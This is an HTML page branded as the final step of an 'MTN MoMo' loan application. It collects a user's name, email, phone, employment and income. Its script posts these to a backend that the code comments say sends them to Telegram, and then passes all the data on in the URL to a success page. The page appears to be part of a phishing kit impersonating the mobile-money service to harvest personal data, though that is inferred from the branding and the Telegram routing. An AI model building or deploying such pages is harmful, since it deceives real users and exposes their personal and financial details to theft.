<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loan Application - MoMo</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }

        body {
            background: #f4f4f4;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* ===== HEADER ===== */
        .header {
            background: #ffffff;
            padding: 14px 24px;
            display: flex;
            align-items: center;
            gap: 16px;
            border-bottom: 3px solid #ffcc00;
            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
        }

        .back-arrow {
            font-size: 22px;
            color: #333;
            text-decoration: none;
            line-height: 1;
            cursor: pointer;
            transition: transform 0.2s;
        }

        .back-arrow:hover {
            transform: translateX(-3px);
        }

        .logo-box {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .logo-icon {
            width: 42px;
            height: 42px;
            background: #ffcc00;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 800;
            font-size: 11px;
            color: #004f9f;
            line-height: 1;
            text-align: center;
            border: 2px solid #004f9f;
        }

        .logo-text {
            font-weight: 800;
            font-size: 20px;
            color: #004f9f;
            letter-spacing: -0.5px;
        }

        .header-title {
            font-size: 16px;
            font-weight: 700;
            color: #222;
            margin-left: 4px;
            flex: 1;
        }

        .hamburger {
            font-size: 22px;
            color: #333;
            cursor: pointer;
            line-height: 1;
            user-select: none;
        }

        /* ===== MAIN ===== */
        .main {
            flex: 1;
            display: flex;
            justify-content: center;
            padding: 40px 16px 60px;
        }

        .card {
            background: #ffffff;
            width: 100%;
            max-width: 520px;
            border-radius: 16px;
            padding: 40px 36px 36px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.08);
            height: fit-content;
        }

        .card h1 {
            font-size: 28px;
            font-weight: 800;
            color: #111;
            text-align: center;
            margin-bottom: 8px;
        }

        .step-text {
            text-align: center;
            color: #888;
            font-size: 14px;
            margin-bottom: 16px;
        }

        /* ===== PROGRESS BAR ===== */
        .progress {
            display: flex;
            gap: 8px;
            margin-bottom: 32px;
            justify-content: center;
        }

        .progress .bar {
            height: 5px;
            width: 70px;
            border-radius: 3px;
            background: #e0e0e0;
        }

        .progress .bar.active {
            background: #ffcc00;
        }

        /* ===== FORM ===== */
        .form-group {
            margin-bottom: 22px;
        }

        .form-group label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #333;
            margin-bottom: 8px;
        }

        .form-group input,
        .form-group select {
            width: 100%;
            padding: 14px 16px;
            font-size: 15px;
            font-family: inherit;
            border: 1.5px solid #ddd;
            border-radius: 10px;
            background: #fff;
            color: #111;
            outline: none;
            transition: border-color 0.2s, box-shadow 0.2s;
        }

        .form-group input:focus,
        .form-group select:focus {
            border-color: #ffcc00;
            box-shadow: 0 0 0 3px rgba(255, 204, 0, 0.2);
        }

        .form-group select {
            appearance: none;
            -webkit-appearance: none;
            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23333' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
            background-repeat: no-repeat;
            background-position: right 14px center;
            background-size: 18px;
            padding-right: 44px;
            cursor: pointer;
        }

        .form-group input::placeholder {
            color: #aaa;
        }

        /* ===== SUMMARY BOX ===== */
        .summary-box {
            border: 2px solid #ffcc00;
            border-radius: 14px;
            padding: 24px 24px 18px;
            background: #fffdf5;
            margin-top: 32px;
            margin-bottom: 32px;
        }

        .summary-box h2 {
            font-size: 19px;
            font-weight: 800;
            color: #b8860b;
            margin-bottom: 22px;
        }

        .summary-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding-bottom: 14px;
            margin-bottom: 14px;
            border-bottom: 1px solid #ffe8a3;
            font-size: 15px;
        }

        .summary-row:last-child {
            border-bottom: none;
            padding-bottom: 0;
            margin-bottom: 0;
        }

        .summary-label {
            color: #666;
            font-weight: 500;
        }

        .summary-value {
            color: #111;
            font-weight: 700;
            text-align: right;
        }

        /* ===== BUTTONS ===== */
        .btn-group {
            display: flex;
            gap: 14px;
            margin-top: 12px;
        }

        .prev-btn {
            flex: 1;
            background: #f0f0f0;
            color: #333;
            border: none;
            padding: 16px;
            font-size: 15px;
            font-weight: 800;
            letter-spacing: 1px;
            border-radius: 10px;
            cursor: pointer;
            transition: background 0.2s, transform 0.1s;
            text-transform: uppercase;
            text-align: center;
            text-decoration: none;
            display: inline-block;
        }

        .prev-btn:hover {
            background: #e0e0e0;
        }

        .submit-btn {
            flex: 1.4;
            background: #ffcc00;
            color: #111;
            border: none;
            padding: 16px;
            font-size: 15px;
            font-weight: 800;
            letter-spacing: 1px;
            border-radius: 10px;
            cursor: pointer;
            transition: background 0.2s, transform 0.1s;
            text-transform: uppercase;
            text-align: center;
            text-decoration: none;
            display: inline-block;
        }

        .submit-btn:hover {
            background: #e6b800;
        }

        .submit-btn:active,
        .prev-btn:active {
            transform: scale(0.99);
        }

        /* ===== FOOTER ===== */
        .footer {
            background: #111;
            color: #ffcc00;
            text-align: center;
            padding: 18px;
            font-size: 13px;
            font-weight: 600;
        }

        @media (max-width: 480px) {
            .card {
                padding: 28px 20px;
            }
            .card h1 {
                font-size: 23px;
            }
            .header-title {
                font-size: 14px;
            }
            .logo-text {
                font-size: 18px;
            }
            .progress .bar {
                width: 55px;
            }
            .btn-group {
                flex-direction: column;
            }
        }
    </style>
</head>
<body>

    <!-- HEADER -->
    <header class="header">
        <a href="details.html" class="back-arrow">←</a>
        <div class="logo-box">
            <div class="logo-icon">MoMo<br>MTN</div>
            <span class="logo-text">MoMo</span>
        </div>
        <span class="header-title">MTN Mobile Services</span>
        <span class="hamburger">☰</span>
    </header>

    <!-- MAIN -->
    <main class="main">
        <div class="card">
            <h1>Loan Application</h1>
            <p class="step-text">Step 3 of 3</p>

            <!-- Progress bar - all active -->
            <div class="progress">
                <div class="bar active"></div>
                <div class="bar active"></div>
                <div class="bar active"></div>
            </div>

            <!-- FORM -->
            <form id="confirmForm">
                <!-- Employment Status -->
                <div class="form-group">
                    <label for="employment">Employment Status</label>
                    <select id="employment" name="employment">
                        <option value="employed" selected>Employed</option>
                        <option value="self-employed">Self-Employed</option>
                        <option value="part-time">Part-time</option>
                        <option value="student">Student</option>
                        <option value="unemployed">Unemployed</option>
                    </select>
                </div>

                <!-- Annual Income -->
                <div class="form-group">
                    <label for="income">Annual Income (ZMW)</label>
                    <input type="number" id="income" name="income" placeholder="50,000">
                </div>

                <!-- Application Summary -->
                <div class="summary-box">
                    <h2>Application Summary</h2>

                    <div class="summary-row">
                        <span class="summary-label">Loan Amount:</span>
                        <span class="summary-value" id="sumAmount">ZMW 5,000</span>
                    </div>
                    <div class="summary-row">
                        <span class="summary-label">Loan Term:</span>
                        <span class="summary-value" id="sumTerm">12 Months</span>
                    </div>
                    <div class="summary-row">
                        <span class="summary-label">Purpose:</span>
                        <span class="summary-value" id="sumPurpose">fee</span>
                    </div>
                    <div class="summary-row">
                        <span class="summary-label">Applicant:</span>
                        <span class="summary-value" id="sumApplicant">Jessy Kimutai</span>
                    </div>
                </div>

                <!-- Buttons -->
                <div class="btn-group">
                    <a href="details.html" class="prev-btn" id="prevBtn">Previous</a>
                    <a href="success.html" class="submit-btn" id="submitBtn">Submit Application</a>
                </div>
            </form>
        </div>
    </main>

    <!-- FOOTER -->
    <footer class="footer">
        © 2026 MoMo
    </footer>

   <script>
    // ─── Read all data from URL params ───
    const params = new URLSearchParams(window.location.search);

    const amount    = params.get('amount')    || '5000';
    const term      = params.get('term')      || '12';
    const purpose   = params.get('purpose')   || 'fee';
    const firstName = params.get('firstName') || '';
    const lastName  = params.get('lastName')  || '';
    const email     = params.get('email')     || '';
    const phone     = params.get('phone')     || '';
    const loanType  = params.get('type')      || 'personal';

    // ─── Fill in the summary box ───
    document.getElementById('sumAmount').textContent    = 'ZMW ' + Number(amount).toLocaleString();
    document.getElementById('sumTerm').textContent      = term + ' Months';
    document.getElementById('sumPurpose').textContent   = decodeURIComponent(purpose);
    document.getElementById('sumApplicant').textContent = (firstName + ' ' + lastName).trim() || '—';

    // ─── PREVIOUS keeps data intact ───
    document.getElementById('prevBtn').addEventListener('click', function () {
        this.href = `details.html?${params.toString()}`;
    });

    // ─── SUBMIT → send to Telegram backend → then go to success.html (WITH data) ───
    document.getElementById('submitBtn').addEventListener('click', async function (e) {
        e.preventDefault();

        const employment = document.getElementById('employment').value;
        const income     = document.getElementById('income').value;

        this.textContent = 'Submitting...';
        this.style.pointerEvents = 'none';

        const payload = {
            amount, term,
            purpose: decodeURIComponent(purpose),
            firstName, lastName, email, phone,
            loanType,
            employment, income
        };

        try {
            await fetch('/api/submit-application', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            console.log('✅ Application sent to Telegram');
        } catch (err) {
            console.error('❌ Failed to send:', err);
        }

        // ✅ Forward ALL client info to success.html
        const forward = new URLSearchParams(params);
        forward.set('employment', employment);
        forward.set('income', income);

        window.location.href = 'success.html?' + forward.toString();
    });
</script>
</body>
</html>
